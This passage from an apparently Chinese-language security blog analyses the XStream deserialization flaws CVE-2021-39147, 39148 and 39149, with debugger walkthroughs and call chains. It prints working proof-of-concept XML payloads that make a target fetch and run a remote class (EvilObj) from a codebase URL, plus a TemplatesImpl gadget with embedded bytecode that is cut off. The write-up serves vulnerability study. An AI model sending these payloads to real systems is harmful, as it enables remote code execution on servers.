<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131808123.png" alt="image-20230413180852010"></p>
<p>由于value对象不同导致调用不同的createValue方法，这里调用的是ProxyLazyValue的createValue方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131812946.png" alt="image-20230413181209819"></p>
<p>在createValue方法中，获取类名InitialContext，注册类，获取参数类型，根据参数类型获取该类的doLookup方法，执行该方法，传递实参。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131814337.png" alt="image-20230413181445238"></p>
<p>在doLookup方法造成JNDI注入。</p>
<h2 id="CVE-2021-39147"><a href="#CVE-2021-39147" class="headerlink" title="CVE-2021-39147"></a>CVE-2021-39147</h2><h3 id="分析-24"><a href="#分析-24" class="headerlink" title="分析"></a>分析</h3><p>同样是远程拉取类并实例化造成RCE的漏洞，官方的POC不能直接运行，修正并简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">        &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">        &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">        &lt;bodyParts/&gt;</span><br><span class="line">        &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">          &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">            &lt;soapPart/&gt;</span><br><span class="line">            &lt;mm&gt;</span><br><span class="line">              &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapSearchEnumeration&#x27;&gt;</span><br><span class="line">                  &lt;listArg class=&#x27;javax.naming.CompoundName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                    &lt;javax.naming.CompoundName&gt;</span><br><span class="line">                      &lt;properties/&gt;</span><br><span class="line">                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                      &lt;string&gt;ysomap&lt;/string&gt;</span><br><span class="line">                    &lt;/javax.naming.CompoundName&gt;</span><br><span class="line">                  &lt;/listArg&gt;</span><br><span class="line">                  &lt;enumClnt /&gt;</span><br><span class="line">                  &lt;limit&gt;1&lt;/limit&gt;</span><br><span class="line">                  &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                  &lt;homeCtx /&gt;</span><br><span class="line">                  &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                  &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                  &lt;startName class=&#x27;javax.naming.ldap.LdapName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                    &lt;javax.naming.ldap.LdapName&gt;</span><br><span class="line">                      &lt;default /&gt;</span><br><span class="line">                      &lt;string&gt;uid=ysomap,ou=oa,dc=example,dc=com&lt;/string&gt;</span><br><span class="line">                    &lt;/javax.naming.ldap.LdapName&gt;</span><br><span class="line">                  &lt;/startName&gt;</span><br><span class="line">                  &lt;searchArgs&gt;</span><br><span class="line">                    &lt;cons&gt;</span><br><span class="line">                      &lt;returnObj&gt;true&lt;/returnObj&gt;</span><br><span class="line">                    &lt;/cons&gt;</span><br><span class="line">                  &lt;/searchArgs&gt;</span><br><span class="line">                  &lt;entries&gt;</span><br><span class="line">                    &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                      &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                      &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                      &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                        &lt;default /&gt;</span><br><span class="line">                        &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                              &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;javaNamingReference&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                              &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;foo&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                              &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;EvilObj&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                       &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                      &lt;/attributes&gt;</span><br><span class="line">                    &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                  &lt;/entries&gt;</span><br><span class="line">                &lt;/aliases&gt;</span><br><span class="line">              &lt;/it&gt;</span><br><span class="line">            &lt;/mm&gt;</span><br><span class="line">          &lt;/multiPart&gt;</span><br><span class="line">        &lt;/sm&gt;</span><br><span class="line">      &lt;/message&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>从RdnEntry到KeyStoreResolver$KeyStoreIterator与39145是完全相同的，这里直接从findNextCert方法开始（从这里开始不同）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132049728.png" alt="image-20230413204918623"></p>
<p>判断是否有下一个元素，进入hasMoreElements方法查看。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132050272.png" alt="image-20230413205025177"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132050498.png" alt="image-20230413205041384"></p>
<p>返回true，说明有下一个元素，回到findNextCert方法中来，进入while循环：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132051883.png" alt="image-20230413205112758"></p>
<p>调用nextElement方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132051740.png" alt="image-20230413205142612"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132051307.png" alt="image-20230413205154237"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132052159.png" alt="image-20230413205208055"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132052655.png" alt="image-20230413205252574"></p>
<p>这些都和39145相同，调用createItem方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132059191.png" alt="image-20230413205924086"></p>
<p>在createItem方法中，同样也是判断javaClassName是否非空，则调用decodeObject方法创建Reference：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132101892.png" alt="image-20230413210111761"></p>
<p>然后调用getObjectInstance方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132101080.png" alt="image-20230413210149969"></p>
<p>在getObjectInstance方法中将Reference（ref）继续传递给getObjectFactoryFromReference方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132102671.png" alt="image-20230413210243566"></p>
<p>在getObjectFactoryFromReference方法中同样也是先从本地加载工厂类，加载不到再从远程codebase加载，然后实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132103789.png" alt="image-20230413210354671"></p>
<p>与<a href="#CVE-2021-39145">CVE-2021-39145</a>完全一样，这里只是粗略的说一说，详细的话请看<a href="#CVE-2021-39145">CVE-2021-39145</a>。</p>
<p>调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at javax.naming.spi.NamingManager.getObjectFactoryFromReference</span><br><span class="line">at javax.naming.spi.DirectoryManager.getObjectInstance</span><br><span class="line">at com.sun.jndi.ldap.LdapSearchEnumeration.createItem</span><br><span class="line">at com.sun.jndi.ldap.LdapSearchEnumeration.createItem</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextAux</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextImpl</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.next</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextElement</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextElement</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.findNextCert</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.hasNext</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.parseAll</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parseAll</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parse</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimeMultipart.getCount</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.initializeAllAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet.&lt;init&gt;</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.MessageWrapper.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.Packet.toString</span><br><span class="line">at com.sun.org.apache.xpath.internal.objects.XString.equals</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at java.util.TreeMap.put</span><br><span class="line">at java.util.AbstractMap.putAll</span><br><span class="line">at java.util.TreeMap.putAll</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2021-39148"><a href="#CVE-2021-39148" class="headerlink" title="CVE-2021-39148"></a>CVE-2021-39148</h2><h3 id="分析-25"><a href="#分析-25" class="headerlink" title="分析"></a>分析</h3><p>同样是远程拉取类并实例化造成RCE的漏洞，简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">        &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">        &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">        &lt;bodyParts/&gt;</span><br><span class="line">        &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">          &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">            &lt;soapPart/&gt;</span><br><span class="line">            &lt;mm&gt;</span><br><span class="line">              &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.ContextEnumerator&#x27;&gt;</span><br><span class="line">                  &lt;children class=&#x27;javax.naming.directory.BasicAttribute$ValuesEnumImpl&#x27;&gt;</span><br><span class="line">                    &lt;list class=&#x27;com.sun.xml.internal.dtdparser.SimpleHashtable&#x27;&gt;</span><br><span class="line">                      &lt;current&gt;</span><br><span class="line">                        &lt;hash&gt;1&lt;/hash&gt;</span><br><span class="line">                        &lt;key class=&#x27;javax.naming.Binding&#x27;&gt;</span><br><span class="line">                          &lt;name&gt;ysomap&lt;/name&gt;</span><br><span class="line">                            &lt;boundObj class=&#x27;com.sun.jndi.ldap.LdapReferralContext&#x27;&gt;</span><br><span class="line">                              &lt;refCtx class=&#x27;javax.naming.spi.ContinuationDirContext&#x27;&gt;</span><br><span class="line">                                &lt;cpe&gt;</span><br><span class="line">                                  &lt;resolvedObj class=&#x27;javax.naming.Reference&#x27;&gt;</span><br><span class="line">                                    &lt;className&gt;EvilObj&lt;/className&gt;</span><br><span class="line">                                    &lt;addrs/&gt;</span><br><span class="line">                                    &lt;classFactory&gt;EvilObj&lt;/classFactory&gt;</span><br><span class="line">                                    &lt;classFactoryLocation&gt;http://127.0.0.1:2333/&lt;/classFactoryLocation&gt;</span><br><span class="line">                                  &lt;/resolvedObj&gt;</span><br><span class="line">                                &lt;/cpe&gt;</span><br><span class="line">                              &lt;/refCtx&gt;</span><br><span class="line">                            &lt;/boundObj&gt;</span><br><span class="line">                        &lt;/key&gt;</span><br><span class="line">                      &lt;/current&gt;</span><br><span class="line">                    &lt;/list&gt;</span><br><span class="line">                  &lt;/children&gt;</span><br><span class="line">                  &lt;currentReturned&gt;true&lt;/currentReturned&gt;</span><br><span class="line">                  &lt;rootProcessed&gt;true&lt;/rootProcessed&gt;</span><br><span class="line">                  &lt;scope&gt;2&lt;/scope&gt;</span><br><span class="line">                &lt;/aliases&gt;</span><br><span class="line">              &lt;/it&gt;</span><br><span class="line">            &lt;/mm&gt;</span><br><span class="line">          &lt;/multiPart&gt;</span><br><span class="line">        &lt;/sm&gt;</span><br><span class="line">      &lt;/message&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>这次也是KeyStoreResolver$KeyStoreIterator中开始：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132114964.png" alt="image-20230413211440860"></p>
<p>判断是否有下个元素。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132116807.png" alt="image-20230413211613733"></p>
<p>结果返回true。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132136421.png" alt="image-20230413213629340"></p>
<p>进入while循环，调用nextElement方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132137031.png" alt="image-20230413213739932"></p>
<p>进入getNextDescendant方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132138650.png" alt="image-20230413213818572"></p>
<p>第一个if为false，else-if也为false，进入else分支，执行prepNextChild方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132139847.png" alt="image-20230413213938750"></p>
<p>获取下一个元素，然后调用newEnumerator方法。currentChild.getObject()获取的是LdapReferralContext对象。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132141042.png" alt="image-20230413214102925"></p>
<p>调用getImmediateChildren将LdapReferralContext对象传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132142736.png" alt="image-20230413214207633"></p>
<p>调用LdapReferralContext对象的listBindings方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132143662.png" alt="image-20230413214309582"></p>
<p>调用refCtx属性（ContinuationDirContext）的listBindings方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132144476.png" alt="image-20230413214400386"></p>
<p>调用getTargetContext方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132145806.png" alt="image-20230413214512709"></p>
<p>调用cpe属性的getResolvedObj获取resolvedObj（Reference）。然后调用getContext方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132146689.png" alt="image-20230413214656619"></p>
<p>只需要关注第一个参数即可，然后调用getObjectInstance方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132147170.png" alt="image-20230413214731067"></p>
<p>接着在getObjectInstance方法里调用了getObjectFactoryFromReference方法，该方法想必很熟悉了。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131729062.png" alt="image-20230413172923929"></p>
<p>远程加载类并实例化，造成RCE。</p>
<p>调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at javax.naming.spi.NamingManager.getObjectFactoryFromReference</span><br><span class="line">at javax.naming.spi.NamingManager.getObjectInstance</span><br><span class="line">at javax.naming.spi.NamingManager.getContext</span><br><span class="line">at javax.naming.spi.ContinuationContext.getTargetContext</span><br><span class="line">at javax.naming.spi.ContinuationContext.listBindings</span><br><span class="line">at com.sun.jndi.ldap.LdapReferralContext.listBindings</span><br><span class="line">at com.sun.jndi.ldap.LdapReferralContext.listBindings</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.getImmediateChildren</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.&lt;init&gt;</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.newEnumerator</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.prepNextChild</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.getNextDescendant</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.next</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.nextElement</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.nextElement</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.findNextCert</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.hasNext</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.parseAll</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parseAll</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parse</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimeMultipart.getCount</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.initializeAllAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet.&lt;init&gt;</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.MessageWrapper.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.Packet.toString</span><br><span class="line">at com.sun.org.apache.xpath.internal.objects.XString.equals</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at java.util.TreeMap.put</span><br><span class="line">at java.util.AbstractMap.putAll</span><br><span class="line">at java.util.TreeMap.putAll</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2021-39149"><a href="#CVE-2021-39149" class="headerlink" title="CVE-2021-39149"></a>CVE-2021-39149</h2><h3 id="分析-26"><a href="#分析-26" class="headerlink" title="分析"></a>分析</h3><p>该漏洞直接造成RCE，修正后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt;</span><br><span class="line">    &lt;interface&gt;map&lt;/interface&gt;</span><br><span class="line">    &lt;handler class=&#x27;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&#x27;&gt;</span><br><span class="line">	  &lt;classToInvocationHandler class=&#x27;linked-hash-map&#x27;/&gt;</span><br><span class="line">      &lt;defaultHandler class=&#x27;sun.tracing.NullProvider&#x27;&gt;</span><br><span class="line">        &lt;active&gt;true&lt;/active&gt;</span><br><span class="line">        &lt;providerType&gt;java.lang.Object&lt;/providerType&gt;</span><br><span class="line">        &lt;probes&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method&gt;</span><br><span class="line">              &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">              &lt;name&gt;hashCode&lt;/name&gt;</span><br><span class="line">              &lt;parameter-types/&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">            &lt;sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">              &lt;proxy class=&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27; serialization=&#x27;custom&#x27; &gt;</span><br><span class="line">                &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">                  &lt;default&gt;</span><br><span class="line">                    &lt;__name&gt;Pwnr&lt;/__name&gt;</span><br><span class="line">                    &lt;__bytecodes&gt;</span><br><span class="line">                      &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0c